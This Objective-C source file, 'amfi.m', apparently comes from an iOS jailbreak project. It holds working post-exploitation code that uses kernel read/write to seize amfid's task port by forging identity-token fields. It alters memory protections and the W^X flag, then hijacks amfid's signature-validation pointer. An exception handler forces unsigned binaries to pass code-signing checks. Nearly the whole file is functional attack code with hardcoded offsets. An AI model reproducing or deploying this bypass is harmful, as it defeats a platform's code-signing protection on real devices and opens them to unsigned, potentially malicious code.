//
//  amfi.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <pthread.h>
#import <mach-o/fat.h>
#import <mach-o/nlist.h>
#import <mach-o/getsect.h>
#import <CommonCrypto/CommonCrypto.h>
#import <sys/stat.h>
#import <sys/mman.h>
#import "amfi.h"
#import "krw.h"
#import "offsets.h"

#define CS_CDHASH_LEN 20
static mach_port_t amfid_task_port = MACH_PORT_NULL;
static mach_port_t exceptionPort = MACH_PORT_NULL;
static pthread_t exceptionThread;
static uint64_t origAMFID_MISVSACI = 0;
static size_t amfid_fsize = 0;
static uint64_t patchAddr = 0;

typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    NDR_record_t NDR;
} exception_raise_request; // the bits we need at least

uint8_t* map_file_to_mem(const char * path){
    struct stat fstat = {0};
    stat(path, &fstat);
    amfid_fsize = fstat.st_size;
    
    int fd = open(path, O_RDONLY);
    uint8_t *mapping_mem = mmap(NULL, mach_vm_round_page(amfid_fsize), PROT_READ, MAP_SHARED, fd, 0);
    if((int)mapping_mem == -1){
        NSLog(@"Error in map_file_to_mem(): mmap() == -1\n");
        return 0;
    }
    return mapping_mem;
}

uint64_t find_amfid_OFFSET_MISValidate_symbol(uint8_t* amfid_macho) {
    uint32_t MISValidate_symIndex = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)amfid_macho;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)(mh + 1);
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SYMTAB:{
                struct symtab_command *sym_cmd = (struct symtab_command*)cmd;
                uint32_t symoff = sym_cmd->symoff;
                uint32_t nsyms = sym_cmd->nsyms;
                uint32_t stroff = sym_cmd->stroff;
                
                for(int i =0;i<nsyms;i++){
                    struct nlist_64 *nn = (void*)((char*)mh+symoff+i*sizeof(struct nlist_64));
                    char *def_str = NULL;
                    if(nn->n_type==0x1){
                        // 0x1 indicates external function
                        def_str = (char*)mh+(uint32_t)nn->n_un.n_strx + stroff;
                        if(!strcmp(def_str, "_MISValidateSignatureAndCopyInfo")){
                            break;
                        }
                    }
                    if(i!=0 && i!=1){ // Two at beginning are local symbols, they don't count
                        MISValidate_symIndex++;
                    }
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    
    if(MISValidate_symIndex == 0){
        printf("Error in find_amfid_OFFSET_MISValidate_symbol(): MISValidate_symIndex == 0\n");
        return 0;
    }
    
    const struct section_64 *sect_info = NULL;
    const char *_segment = "__DATA", *_section = "__la_symbol_ptr";
    sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    
    if(!sect_info){
        printf("Error in find_amfid_OFFSET_MISValidate_symbol(): if(!sect_info)\n");
        return 0;
    }
    
    return sect_info->offset + (MISValidate_symIndex * 0x8);
}

void* amfidRead(uint64_t addr, uint64_t len) {
    kern_return_t ret;
    vm_offset_t buf = 0;
    mach_msg_type_number_t num = 0;
    ret = mach_vm_read(amfid_task_port, addr, len, &buf, &num);
    if (ret != KERN_SUCCESS) {
        printf("[-] amfid read failed (0x%llx)\n", addr);
        return NULL;
    }
    uint8_t* outbuf = malloc(len);
    memcpy(outbuf, (void*)buf, len);
    mach_vm_deallocate(mach_task_self(), buf, num);
    return outbuf;
}

void amfidWrite32(uint64_t addr, uint32_t data) {
    kern_return_t err = mach_vm_write(amfid_task_port, addr, (vm_offset_t)&data, (mach_msg_type_number_t)sizeof(uint32_t));
    if (err != KERN_SUCCESS) {
        NSLog(@"failed amfidWrite32: %s", mach_error_string(err));
    }
}

void amfidWrite64(uint64_t addr, uint64_t data) {
    kern_return_t err = mach_vm_write(amfid_task_port, addr, (vm_offset_t)&data, (mach_msg_type_number_t)sizeof(uint64_t));
    if(err != KERN_SUCCESS) {
        NSLog(@"failed amfidWrite64: %s", mach_error_string(err));
    }
}

void task_read(mach_port_t task, uintptr_t addr, void *data, size_t len){
    kern_return_t kr;
    vm_size_t outsize = len;

    kr = vm_read_overwrite(task, addr, len, (vm_address_t)data, &outsize);
    if (kr != KERN_SUCCESS) {
        printf("[-] %s: kr %d: %s\n", __func__, kr, mach_error_string(kr));
    }
}

void task_write(mach_port_t task, uintptr_t addr, void *data, size_t len){
    kern_return_t kr;
    mach_msg_type_number_t size = (mach_msg_type_number_t)len;

    kr = vm_write(task, addr, (vm_offset_t)data, size);
    if (kr != KERN_SUCCESS) {
        printf("[-] %s: kr %d: %s\n", __func__, kr, mach_error_string(kr));
    }
}

uint64_t task_read64(mach_port_t task, uintptr_t addr){
    uint64_t v = 0;
    task_read(task, addr, &v, sizeof(v));
    return v;
}

void task_write64(mach_port_t task, uintptr_t addr, uint64_t v){
    task_write(task, addr, &v, sizeof(v));
}

uint64_t task_alloc(mach_port_t task, size_t len){
    vm_address_t return_addr = 0;
    vm_allocate(task, (vm_address_t*)&return_addr, len, VM_FLAGS_ANYWHERE);
    return return_addr;
}

void task_dealloc(mach_port_t task, uint64_t addr, size_t len){
    vm_deallocate(task, addr, len);
}

uint32_t swap_uint32( uint32_t val ) {
    val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
    return (val << 16) | (val >> 16);
}

uint32_t read_magic(FILE* file, off_t offset) {
    uint32_t magic;
    fseek(file, offset, SEEK_SET);
    fread(&magic, sizeof(uint32_t), 1, file);
    return magic;
}

void *load_bytes(FILE *file, off_t offset, size_t size) {
    void *buf = calloc(1, size);
    fseek(file, offset, SEEK_SET);
    fread(buf, size, 1, file);
    return buf;
}

uint8_t *getCodeDirectory(const char* name) {
    
    FILE* fd = fopen(name, "r");
    
    uint32_t magic;
    fread(&magic, sizeof(magic), 1, fd);
    fseek(fd, 0, SEEK_SET);
    
    long off = 0, file_off = 0;
    int ncmds = 0;
    BOOL foundarm64 = false;
    
    if (magic == MH_MAGIC_64) { // 0xFEEDFACF
        struct mach_header_64 mh64;
        fread(&mh64, sizeof(mh64), 1, fd);
        off = sizeof(mh64);
        ncmds = mh64.ncmds;
    }
    else if (magic == MH_MAGIC) {
        printf("[-] %s is 32bit. What are you doing here?\n", name);
        fclose(fd);
        return NULL;
    }
    else if (magic == 0xBEBAFECA) { //FAT binary magic
        
        size_t header_size = sizeof(struct fat_header);
        size_t arch_size = sizeof(struct fat_arch);
        size_t arch_off = header_size;
        
        struct fat_header *fat = (struct fat_header*)load_bytes(fd, 0, header_size);
        struct fat_arch *arch = (struct fat_arch *)load_bytes(fd, arch_off, arch_size);
        
        int n = swap_uint32(fat->nfat_arch);
        printf("[*] Binary is FAT with %d architectures\n", n);
        
        while (n-- > 0) {
            magic = read_magic(fd, swap_uint32(arch->offset));
            
            if (magic == 0xFEEDFACF) {
                printf("[*] Found arm64\n");
                foundarm64 = true;
                struct mach_header_64* mh64 = (struct mach_header_64*)load_bytes(fd, swap_uint32(arch->offset), sizeof(struct mach_header_64));
                file_off = swap_uint32(arch->offset);
                off = swap_uint32(arch->offset) + sizeof(struct mach_header_64);
                ncmds = mh64->ncmds;
                break;
            }
            
            arch_off += arch_size;
            arch = load_bytes(fd, arch_off, arch_size);
        }
        
        if (!foundarm64) { // by the end of the day there's no arm64 found
            printf("[-] No arm64? RIP\n");
            fclose(fd);
            return NULL;
        }
    }
    else {
        printf("[-] %s is not a macho! (or has foreign endianness?) (magic: %x)\n", name, magic);
        fclose(fd);
        return NULL;
    }
    
    for (int i = 0; i < ncmds; i++) {
        struct load_command cmd;
        fseek(fd, off, SEEK_SET);
        fread(&cmd, sizeof(struct load_command), 1, fd);
        if (cmd.cmd == LC_CODE_SIGNATURE) {
            uint32_t off_cs;
            fread(&off_cs, sizeof(uint32_t), 1, fd);
            uint32_t size_cs;
            fread(&size_cs, sizeof(uint32_t), 1, fd);
            
            uint8_t *cd = malloc(size_cs);
            fseek(fd, off_cs + file_off, SEEK_SET);
            fread(cd, size_cs, 1, fd);
            fclose(fd);
            return cd;
        } else {
            off += cmd.cmdsize;
        }
    }
    fclose(fd);
    return NULL;
}

static unsigned int hash_rank(const CodeDirectory *cd)
{
    uint32_t type = cd->hashType;
    unsigned int n;
    
    for (n = 0; n < sizeof(hashPriorities) / sizeof(hashPriorities[0]); ++n)
        if (hashPriorities[n] == type)
            return n + 1;
    return 0;    /* not supported */
}

int get_hash(const CodeDirectory* directory, uint8_t dst[CS_CDHASH_LEN]) {
    uint32_t realsize = ntohl(directory->length);
    
    if (ntohl(directory->magic) != CSMAGIC_CODEDIRECTORY) {
        NSLog(@"[get_hash] wtf, not CSMAGIC_CODEDIRECTORY?!");
        return 1;
    }
    
    uint8_t out[CS_HASH_MAX_SIZE];
    uint8_t hash_type = directory->hashType;
    
    switch (hash_type) {
        case CS_HASHTYPE_SHA1:
            CC_SHA1(directory, realsize, out);
            break;
            
        case CS_HASHTYPE_SHA256:
        case CS_HASHTYPE_SHA256_TRUNCATED:
            CC_SHA256(directory, realsize, out);
            break;
            
        case CS_HASHTYPE_SHA384:
            CC_SHA384(directory, realsize, out);
            break;
            
        default:
            NSLog(@"[get_hash] Unknown hash type: 0x%x", hash_type);
            return 2;
    }
    
    memcpy(dst, out, CS_CDHASH_LEN);
    return 0;
}

int parse_superblob(uint8_t *code_dir, uint8_t dst[CS_CDHASH_LEN]) {
    int ret = 1;
    const CS_SuperBlob *sb = (const CS_SuperBlob *)code_dir;
    uint8_t highest_cd_hash_rank = 0;
    
    for (int n = 0; n < ntohl(sb->count); n++){
        const CS_BlobIndex *blobIndex = &sb->index[n];
        uint32_t type = ntohl(blobIndex->type);
        uint32_t offset = ntohl(blobIndex->offset);
        if (ntohl(sb->length) < offset) {
            NSLog(@"offset of blob #%d overflows superblob length", n);
            return 1;
        }
        
        const CodeDirectory *subBlob = (const CodeDirectory *)(code_dir + offset);
        // size_t subLength = ntohl(subBlob->length);
        
        //  https://github.com/Odyssey-Team/Odyssey/blob/7682a881ffec2c43fe3ed856215ca08e1139fe9e/Odyssey/post-exploit/utils/machoparse.swift#L169
        if (type == CSSLOT_CODEDIRECTORY || (type >= CSSLOT_ALTERNATE_CODEDIRECTORIES && type < CSSLOT_ALTERNATE_CODEDIRECTORY_LIMIT)) {
            uint8_t rank = hash_rank(subBlob);
            
            if (rank > highest_cd_hash_rank) {
                ret = get_hash(subBlob, dst);
                highest_cd_hash_rank = rank;
            }
        }
    }
    
    return ret;
}

uint64_t load_address(mach_port_t port) {
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL;
    
    mach_vm_address_t first_addr = 0;
    mach_vm_size_t first_size = 0x1000;
    
    struct vm_region_basic_info_64 region = {0};
    
    kern_return_t err = mach_vm_region(port, &first_addr, &first_size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&region, &region_count, &object_name);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to get the region: %s\n", mach_error_string(err));
        return 0;
    }
    
    return first_addr;
}


void* AMFIDExceptionHandler(void* arg) {

    uint32_t size = 0x1000;
    mach_msg_header_t* msg = malloc(size);
    
    for(;;) {
        kern_return_t ret;
        printf("[amfid][*] Calling mach_msg to receive exception message from amfid\n");
        ret = mach_msg(msg, MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, 0, size, exceptionPort, 0, 0);
        
        if (ret != KERN_SUCCESS){
            printf("[amfid][-] Error receiving exception port: %s\n", mach_error_string(ret));
            continue;
        } else {
            printf("[amfid][+] Got called!\n");
            exception_raise_request* req = (exception_raise_request*)msg;
            
            mach_port_t thread_port = req->thread.name;
            mach_port_t task_port = req->task.name;
            
            // we need to get some info from amfid's thread state
            _STRUCT_ARM_THREAD_STATE64 old_state = {0};
            mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
            
            ret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
            if (ret != KERN_SUCCESS){
                printf("[amfid][-] Error getting thread state: %s\n", mach_error_string(ret));
                continue;
            }
            
            printf("[amfid][+] Got thread state!\n");
            
            //create a copy of the thread state
            _STRUCT_ARM_THREAD_STATE64 new_state;
            memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
            
            //  https://github.com/Odyssey-Team/Odyssey/blob/master/Odyssey/post-exploit/utils/amfidtakeover.swift#L326
            // get the filename pointed to by X23
            char* filename = (char*)amfidRead(new_state.__x[23], 1024);
            
            if(!filename) {
                printf("[amfid][-] No file name?");
                continue;
            }
            
            uint8_t *orig_cdhash = (uint8_t*)amfidRead(new_state.__x[24], CS_CDHASH_LEN);
            
            printf("[amfid][+] Got request for: %s\n", filename);
            printf("[amfid][*] Original cdhash: \n\t");
            for (int i = 0; i < CS_CDHASH_LEN; i++) {
                printf("%02x ", orig_cdhash[i]);
            }
            printf("\n");
            
            if (strlen((char*)orig_cdhash)) {
                // legit binary
                // jump to old MIVSACI
                printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
                new_state.__pc = origAMFID_MISVSACI;
            } else {
                uint8_t* code_directory = getCodeDirectory(filename);
                if (!code_directory) {
                    printf("[amfid][-] Can't get code directory\n");
                    goto end;
                }
                uint8_t cd_hash[CS_CDHASH_LEN];
                if (parse_superblob(code_directory, cd_hash)) {
                    printf("[amfid][-] parse_superblob failed\n");
                    goto end;
                }
                
                //debug
                printf("[amfid][*] New cdhash: \n\t");
                for (int i = 0; i < CS_CDHASH_LEN; i++) {
                    printf("%02x ", cd_hash[i]);
                }
                printf("\n");
                
                new_state.__pc = origAMFID_MISVSACI;
                
                ret = mach_vm_write(task_port, old_state.__x[24], (vm_offset_t)&cd_hash, 20);
                if (ret == KERN_SUCCESS)
                {
                    printf("[amfid][+] Wrote the cdhash into amfid\n");
                } else {
                    printf("[amfid][-] Unable to write the cdhash into amfid!\n");
                }
                
                // write a 1 to [x19]
                amfidWrite32(old_state.__x[19], 1);
                new_state.__pc = load_address(task_port) + I6S_15_1_AMFID_RET;//(old_state.__lr & 0xfffffffffffff000) + 0x1000; // 0x2dacwhere to continue
                
                printf("[amfid][i] Old PC: 0x%llx, new PC: 0x%llx\n", old_state.__pc, new_state.__pc);
            }
            
            // set the new thread state:
            ret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
            if (ret != KERN_SUCCESS) {
                printf("[amfid][-] Failed to set new thread state %s\n", mach_error_string(ret));
            } else {
                printf("[amfid][+] Success setting new state for amfid!\n");
            }
            
            exception_raise_reply reply = {0};
            
            reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
            reply.Head.msgh_size = sizeof(reply);
            reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
            reply.Head.msgh_local_port = MACH_PORT_NULL;
            reply.Head.msgh_id = req->Head.msgh_id + 0x64;
            
            reply.NDR = req->NDR;
            reply.RetCode = KERN_SUCCESS;
            // MACH_SEND_MSG|MACH_MSG_OPTION_NONE == 1 ???
            ret = mach_msg(&reply.Head,
                           1,
                           (mach_msg_size_t)sizeof(reply),
                           0,
                           MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE,
                           MACH_PORT_NULL);
            
            mach_port_deallocate(mach_task_self(), thread_port);
            mach_port_deallocate(mach_task_self(), task_port);
            if (ret != KERN_SUCCESS){
                printf("[amfid][-] Failed to send the reply to the exception message %s\n", mach_error_string(ret));
            } else{
                printf("[amfid][+] Replied to the amfid exception...\n");
            }
            
        end:;
            free(filename);
            free(orig_cdhash);
        }
    }
    return NULL;
}

mach_port_t get_amfid_task_port(void) {
    task_id_token_t token = 0;
    mach_port_t out_task = 0;
    pid_t amfid_pid = pid_by_name("amfid");
    
    kern_return_t kr = 0;// task_create_identity_token(mach_task_self_, &token);
    printf("[i] Got token: %d\n", token);
    
    uint64_t token_port = port_name_to_ipc_port(token);
    printf("[i] token_port: 0x%llx, amfid_pid: %d\n", token_port, amfid_pid);
    
    uint64_t ipc_obj = kread64(token_port + 0x58);
    uint64_t amfid_proc = proc_of_pid(amfid_pid);//getProc(kslide, amfid_pid);
    uint64_t amfid_task = kread64(amfid_proc + 0x10);
    uint32_t amfid_flags = kread32(amfid_task + 0x3e8);
//    kwrite32(amfid_task + 0x3e8, amfid_flags | 0x20);//TF_CORPSE
    uint64_t p_uniqueid = kread64(amfid_proc + 0x48);
    uint32_t p_pid = kread32(amfid_proc + 0x68);
    uint32_t p_idversion = kread32(amfid_proc + 0x3c4);
    kwrite64(ipc_obj, p_uniqueid);
    printf("pid? %d\n", kread32(ipc_obj+0x8));
    kwrite32(ipc_obj+0x8, p_pid);
    kwrite32(ipc_obj+0xc, p_idversion);
    
    
    kr = 0;//task_identity_token_get_task_port(token, TASK_FLAVOR_CONTROL, &out_task);
    printf("[i] kr ret: %d, out_task: %d\n", kr, out_task);

    kwrite32(amfid_task + 0x3e8, amfid_flags);
    
    return out_task;
}

#define FLAGS_PROT_SHIFT    7
#define FLAGS_MAXPROT_SHIFT 11
//#define FLAGS_PROT_MASK     0xF << FLAGS_PROT_SHIFT
//#define FLAGS_MAXPROT_MASK  0xF << FLAGS_MAXPROT_SHIFT
#define FLAGS_PROT_MASK    0x780
#define FLAGS_MAXPROT_MASK 0x7800

uint64_t kread_ptr(uint64_t kaddr) {
    uint64_t ptr = kread64(kaddr);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }

    return ptr;
}

uint64_t task_get_vm_map(uint64_t task_ptr)
{
    return kread_ptr(task_ptr + 0x28);
}

uint64_t vm_map_get_header(uint64_t vm_map_ptr)
{
    return vm_map_ptr + 0x10;
}

uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr)
{
    return kread_ptr(vm_header_ptr + 0x8);
}

uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr)
{
    return kread_ptr(vm_entry_ptr + 0x8);
}

uint32_t vm_header_get_nentries(uint64_t vm_header_ptr)
{
    return kread32(vm_header_ptr + 0x20);
}

uint64_t vm_map_get_pmap(uint64_t vm_map_ptr)
{
    return kread_ptr(vm_map_ptr + 72 /*bootInfo_getUInt64(@"VM_MAP_PMAP")*/);
}

void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
{
    uint64_t range[2];
    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}


//void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
{
    uint64_t header = vm_map_get_header(vm_map_ptr);
    uint64_t entry = vm_map_header_get_first_entry(header);
    uint64_t numEntries = vm_header_get_nentries(header);

    while (entry != 0 && numEntries > 0) {
        uint64_t start = 0, end = 0;
        vm_entry_get_range(entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(entry);
        numEntries--;
    }
}

uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address)
{
    __block uint64_t found_entry = 0;
        vm_map_iterate_entries(vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
            if (address >= start && address < end) {
                found_entry = entry;
                *stop = YES;
            }
        });
        return found_entry;
}

uint64_t vm_map_entry_set_prot(uint64_t entry_ptr, vm_prot_t prot, vm_prot_t max_prot)
{
    uint64_t flags = kread64(entry_ptr + 0x48);
    uint64_t new_flags = flags;
    new_flags = (new_flags & ~FLAGS_PROT_MASK) | ((uint64_t)prot << FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~FLAGS_MAXPROT_MASK) | ((uint64_t)max_prot << FLAGS_MAXPROT_SHIFT);
    if (new_flags != flags) {
        kwrite64(entry_ptr + 0x48, new_flags);
    }
    return flags;
}

void vm_map_entry_reset_prot(uint64_t entry_ptr, uint64_t flag)
{
    kwrite64(entry_ptr + 0x48, flag);
}

void pmap_set_wx_allowed(uint64_t pmap_ptr, bool wx_allowed)
{
//    uint64_t kernel_el = bootInfo_getUInt64(@"kernel_el");
    uint32_t el2_adjust = 8;//(kernel_el == 8) ? 8 : 0;
    kwrite8(pmap_ptr + 0xC2 + el2_adjust, wx_allowed);
}


#define BREAKPOINT_ENABLE 481
void takeover_amfid(void) {
//    set_task_platform(pid_by_name("amfid"), YES);
    
//    int rc_pid = pid_by_name("ReportCrash");
//    printf("[i] rc_pid: %d\n", rc_pid);
//    uint64_t self_cred = borrow_ucreds(getpid(), rc_pid);
    
    pid_t amfid_pid = pid_by_name("amfid");
    printf("amfid_pid: %d\n", amfid_pid);
//    uint64_t amfid_amfi = borrow_entitlements(amfid_pid, pid_by_name("superEnts"));
//
//    set_task_platform(amfid_pid, YES);
//    set_proc_csflags(amfid_pid);
//    set_csb_platform_binary(amfid_pid);
    
    amfid_task_port = get_amfid_task_port();
//    task_for_pid(mach_task_self(), amfid_pid, &amfid_task_port);

    printf("[i] amfid task port: 0x%x\n", amfid_task_port);
    
    uint64_t amfid_load_address = load_address(amfid_task_port);
    printf("[i] amfid load address: 0x%llx\n", amfid_load_address);
    
    //  set the exception handler
    kern_return_t retVal = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exceptionPort);
    if(retVal != KERN_SUCCESS) {
        NSLog(@"Failed mach_port_allocate: %s", mach_error_string(retVal));
        return;
    }
    
    retVal = mach_port_insert_right(mach_task_self(), exceptionPort, exceptionPort, MACH_MSG_TYPE_MAKE_SEND);
    if(retVal != KERN_SUCCESS) {
        NSLog(@"Failed mach_port_insert_right: %s", mach_error_string(retVal));
        return;
    }
    
    retVal = task_set_exception_ports(amfid_task_port, EXC_MASK_ALL, exceptionPort, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
    if(retVal != KERN_SUCCESS) {
        NSLog(@"Failed task_set_exception_ports: %s", mach_error_string(retVal));
        return;
    }
    pthread_create(&exceptionThread, NULL, AMFIDExceptionHandler, NULL);
    
    //  get MISVSACI offset
    //  https://github.com/GeoSn0w/Blizzard-Jailbreak/blob/2b1193e29f1c8b73ff1d1f09ca7760bfe208553e/Exploits/FreeTheSandbox/ios13_kernel_universal.c#L2909
//    uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
    uint64_t patchOffset = 0xa608;//find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);//[self find_amfid_OFFSET_MISValidate_symbol:amfid_fdata];
    NSLog(@"_MISValidateSignatureAndCopyInfo offset: 0x%llx", patchOffset);
//    munmap(amfid_fdata, amfid_fsize);
    
    //  get origAMFID_MISVSACI
    mach_vm_size_t sz;
    retVal = mach_vm_read_overwrite(amfid_task_port, amfid_load_address+patchOffset, sizeof(uint64_t), (mach_vm_address_t)&origAMFID_MISVSACI, &sz);
    
    if (retVal != KERN_SUCCESS) {
        printf("[amfid][-] Error reading MISVSACI: %s\n", mach_error_string(retVal));
        return;
    }
    printf("[i] Original MISVSACI 0x%llx\n", origAMFID_MISVSACI);
    
    thread_act_port_array_t thread_list;
    mach_msg_type_number_t thread_count;
    mach_msg_type_number_t state_count;
    arm_debug_state64_t state;
    task_threads(amfid_task_port, &thread_list, &thread_count);
    
//    for(int i = 0; i < thread_count; i++) {
//        retVal = thread_set_exception_ports(thread_list[i], EXC_MASK_ALL, exceptionPort, MACH_EXCEPTION_CODES | EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
//        printf("thread_set_exception_ports ret: %d\n", retVal);
//        state_count = ARM_DEBUG_STATE64_COUNT;
//        retVal = thread_get_state(thread_list[i], ARM_DEBUG_STATE64, (thread_state_t) &state, &state_count);
//        printf("[i] thread_get_state ret: %d\n", retVal);
//
//        state.__bvr[0] = amfid_load_address + patchOffset;
//        state.__bcr[0] = BREAKPOINT_ENABLE;
//
//        retVal = thread_set_state(thread_list[i], ARM_DEBUG_STATE64, (thread_state_t)&state, state_count);
//        printf("[i] thread_set_state ret: %d\n", retVal);
//    }
    
//    for(int i = 0; i < thread_count; i++) {
//        printf("thread_set_exception_ports port:%d succeed!\n", thread_list[i]);
//        retVal = thread_set_exception_ports(thread_list[i], EXC_MASK_ALL, exceptionPort, MACH_EXCEPTION_CODES | EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
//        if(retVal) {
//            printf("error setting amfid exception port.\n");
//        } else {
//            printf("thread_set_exception_ports success\n");
//            retVal = thread_get_state(thread_list[i], ARM_DEBUG_STATE64, (thread_state_t) &state, &state_count);
//            if(retVal) {
//                state.__bvr[0] = amfid_load_address + patchOffset;
//                state.__bcr[0] = BREAKPOINT_ENABLE;
//                retVal = thread_set_state(thread_list[i], ARM_DEBUG_STATE64, (thread_state_t)&state, state_count);
//                printf("thread_set_state retVal: %d\n, retVal");
//            }
//        }
//    }
    
    
    //  make it crash, amfi
    printf("amfid_load_address: 0x%llx, mach_vm_trunc_paged: 0x%llx\n", amfid_load_address, mach_vm_trunc_page(amfid_load_address + patchOffset));
    retVal = vm_protect(amfid_task_port, mach_vm_trunc_page(amfid_load_address + patchOffset), vm_page_size, false, VM_PROT_READ);
    if(retVal != KERN_SUCCESS) {
        NSLog(@"Failed vm_protect: %s", mach_error_string(retVal));
    }
    
    //make r/w
//    uint64_t proc = proc_of_pid(getpid());
//    uint64_t task = kread64(proc + off_p_task);
    
    uint64_t vm_ptr = task_get_vm_map(kread64(proc_of_pid(amfid_pid) + off_p_task));
    uint64_t entry_ptr = vm_map_find_entry(vm_ptr, (uint64_t)mach_vm_trunc_page(amfid_load_address + patchOffset));
    printf("entry_ptr: 0x%llx\n", entry_ptr);
    printf("set prot to rw-\n");
    uint64_t pmap = vm_map_get_pmap(vm_ptr);
    pmap_set_wx_allowed(pmap, true);
    uint64_t orig_flag = vm_map_entry_set_prot(entry_ptr, VM_PROT_READ, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    
//    pid_t amfid_pid = pid_by_name("amfid");
//    set_task_platform(amfid_pid, YES);
//    set_proc_csflags(amfid_pid);
//    set_csb_platform_binary(amfid_pid);
    
    
//    uint64_t self_ucred = borrow_ucreds(getpid(), 0);
    retVal = vm_protect(amfid_task_port, mach_vm_trunc_page(amfid_load_address + patchOffset), vm_page_size, false, VM_PROT_READ | VM_PROT_WRITE);
    if(retVal != KERN_SUCCESS) {
        NSLog(@"Failed vm_protect: %s", mach_error_string(retVal));
    }
//    unborrow_ucreds(getpid(), self_ucred);
    
    patchAddr = amfid_load_address + patchOffset;
    uint64_t redirect_pc = 0xffffff8041414141;
    uint64_t old_p = task_read64(amfid_task_port, patchAddr);
    
    task_write64(amfid_task_port, patchAddr, redirect_pc);
    uint64_t new_p = task_read64(amfid_task_port, patchAddr);
    printf("old_p: 0x%llx, new_p: 0x%llx\n", old_p, new_p);
    vm_map_entry_reset_prot(entry_ptr, orig_flag);
    //amfidWrite64(patchAddr, 0x12345);
    
    
//    unborrow_entitlements(pid_by_name("amfid"), amfid_amfi);
//    kill(amfid_pid, SIGKILL);
    
//    unborrow_ucreds(getpid(), self_cred);
}
